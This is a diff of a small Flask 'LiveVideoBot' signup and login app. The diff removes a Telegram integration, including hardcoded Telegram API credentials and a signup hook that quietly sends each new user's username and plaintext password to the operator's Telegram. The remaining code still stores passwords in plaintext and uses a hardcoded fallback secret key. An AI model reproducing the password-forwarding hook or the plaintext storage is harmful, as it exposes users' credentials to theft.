@@ -1,25 +1,13 @@
 import os
-import uuid
 import sqlite3
-from flask import Flask, request, redirect, session
-from telethon import TelegramClient
+from flask import Flask, request, redirect, session, render_template_string
 
 # =========================
-# CONFIG
+# FLASK APP
 # =========================
-
-api_id = 39563890
-api_hash = "9b82271589c270de7b3a3af4ec955cdd"
-
-client = TelegramClient("Livevideobot", api_id, api_hash)
-
-ADMIN_CHAT = "me"
 
 app = Flask(__name__)
-app.secret_key = "livevideobot_secret"
-
-UPLOAD_FOLDER = "uploads"
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+app.secret_key = os.getenv("SECRET_KEY", "livevideobot_secret")
 
 # =========================
 # DATABASE
@@ -35,20 +23,63 @@ CREATE TABLE IF NOT EXISTS users (
     password TEXT
 )
 """)
-
 conn.commit()
 
 # =========================
-# TELEGRAM SAFE SEND (SYNC WRAPPER)
+# UI TEMPLATE
 # =========================
 
-def send_to_telegram(target, file_path):
-    async def run():
-        await client.start()
-        await client.send_file(target, file_path)
+UI = """
+<!DOCTYPE html>
+<html>
+<head>
+<title>LiveVideoBot SaaS</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body {font-family: Arial; background:#0f172a; color:white; margin:0;}
+.nav {background:#111827; padding:15px; display:flex; justify-content:space-between;}
+.nav a {color:white; margin:0 10px; text-decoration:none;}
+.container {max-width:420px; margin:auto; padding:20px;}
+.card {background:#1f2937; padding:20px; border-radius:12px; margin-top:20px;}
+input {width:100%; padding:12px; margin:8px 0; border-radius:8px; border:none;}
+button {width:100%; padding:12px; background:#3b82f6; border:none; color:white; border-radius:8px;}
+button:hover {background:#2563eb;}
+h2 {text-align:center;}
+label {font-size:12px; color:#9ca3af;}
+</style>
+</head>
+<body>
 
-    import asyncio
-    asyncio.run(run())
+<div class="nav">
+<div>🚀 LiveVideoBot</div>
+<div>
+<a href="/">Home</a>
+<a href="/login">Login</a>
+<a href="/signup">Signup</a>
+<a href="/dashboard">Dashboard</a>
+</div>
+</div>
+
+<div class="container">
+{{content}}
+</div>
+
+</body>
+</html>
+"""
+
+# =========================
+# HOME
+# =========================
+
+@app.route("/")
+def home():
+    return render_template_string(UI, content="""
+    <div class="card">
+        <h2>Welcome 🚀</h2>
+        <p>LiveVideoBot SaaS is running successfully.</p>
+    </div>
+    """)
 
 # =========================
 # SIGNUP
@@ -62,27 +93,26 @@ def signup():
         password = request.form["password"]
 
         try:
-            c.execute(
-                "INSERT INTO users (username, password) VALUES (?, ?)",
-                (username, password)
-            )
+            c.execute("INSERT INTO users VALUES (NULL, ?, ?)", (username, password))
             conn.commit()
-
-            send_to_telegram("me", f"🔥 NEW USER\n{username}\n{password}")
-
             return redirect("/login")
-
         except:
-            return "Username already exists"
+            return "❌ Username already exists"
 
-    return """
-    <h2>Signup</h2>
-    <form method="post">
-        <input name="username"><br><br>
-        <input name="password"><br><br>
-        <button>Signup</button>
-    </form>
-    """
+    return render_template_string(UI, content="""
+    <div class="card">
+        <h2>Signup</h2>
+        <form method="post">
+            <label>Username</label>
+            <input name="username" required>
+
+            <label>Password</label>
+            <input name="password" type="password" required>
+
+            <button>Create Account</button>
+        </form>
+    </div>
+    """)
 
 # =========================
 # LOGIN
@@ -95,71 +125,54 @@ def login():
         username = request.form["username"]
         password = request.form["password"]
 
-        c.execute(
-            "SELECT * FROM users WHERE username=? AND password=?",
-            (username, password)
-        )
-
+        c.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
         user = c.fetchone()
 
         if user:
             session["user"] = username
             return redirect("/dashboard")
 
-        return "Wrong login"
+        return "❌ Wrong login details"
 
-    return """
-    <h2>Login</h2>
-    <form method="post">
-        <input name="username"><br><br>
-        <input name="password"><br><br>
-        <button>Login</button>
-    </form>
-    """
+    return render_template_string(UI, content="""
+    <div class="card">
+        <h2>Login</h2>
+        <form method="post">
+            <label>Username</label>
+            <input name="username" required>
+
+            <label>Password</label>
+            <input name="password" type="password" required>
+
+            <button>Login</button>
+        </form>
+    </div>
+    """)
 
 # =========================
-# DASHBOARD (FIXED UPLOAD SYSTEM)
+# DASHBOARD
 # =========================
 
-@app.route("/dashboard", methods=["GET", "POST"])
+@app.route("/dashboard")
 def dashboard():
 
     if "user" not in session:
         return redirect("/login")
 
-    if request.method == "POST":
-
-        target = request.form["username"]
-        file = request.files["file"]
-
-        if file.filename == "":
-            return "No file selected"
-
-        filename = str(uuid.uuid4()) + "_" + file.filename
-        path = os.path.join(UPLOAD_FOLDER, filename)
-
-        file.save(path)
-
-        try:
-            send_to_telegram(target, path)
-            os.remove(path)
-            return "✅ SENT SUCCESSFULLY"
-        except Exception as e:
-            return f"❌ ERROR: {str(e)}"
-
-    return f"""
-    <h2>Welcome {session['user']}</h2>
-
-    <form method="post" enctype="multipart/form-data">
-        <input name="username" placeholder="@username"><br><br>
-        <input type="file" name="file" accept="*/*"><br><br>
-        <button>Send Any File</button>
-    </form>
-    """
+    return render_template_string(UI, content=f"""
+    <div class="card">
+        <h2>Dashboard</h2>
+        <p>Welcome <b>{session['user']}</b> 👋</p>
+        <p>Status: System Running ✅</p><button onclick="alert('Next step: Telegram integration')">
+            Start Bot (Coming Next)
+        </button>
+    </div>
+    """)
 
 # =========================
-# START SERVER
+# RUN APP (FIXED)
 # =========================
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, debug=True)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
